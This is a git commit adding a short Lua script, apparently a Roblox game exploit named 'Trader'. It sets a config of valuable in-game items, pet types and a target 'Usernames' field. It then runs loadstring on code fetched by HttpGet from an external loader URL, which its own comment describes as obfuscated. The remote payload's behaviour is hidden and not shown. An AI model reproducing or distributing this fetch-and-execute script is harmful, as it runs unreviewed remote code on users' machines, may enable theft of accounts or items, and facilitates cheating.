03657f2aed832c30ace85800223c33d6a3c54b29
LordHippo <146130238+ReimuSimpu@users.noreply.github.com>
2025-02-21 19:53:11 -0600

    Create Trader.lua

---
+++ Trader.lua
@@ -0,0 +1,15 @@
+-- Is Obfuscated but free!
+
+getgenv().Trader = {
+    ["Items"] = {
+        ["Currency"] = {
+            ["Diamonds"] = { pt = nil, sh = nil, tn = nil },
+        },
+        ["Egg"] = {
+            ["Huge Machine Egg 4"] = { pt = nil, sh = nil, tn = nil },
+        },
+    },
+    ['Usernames'] = {"USERNAME"},
+    ['All Pets'] = {"Huge", "Titanic"}, -- Add general pet types or specific names
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b19b14b49f5ce19867b84dbac8171333.lua"))()
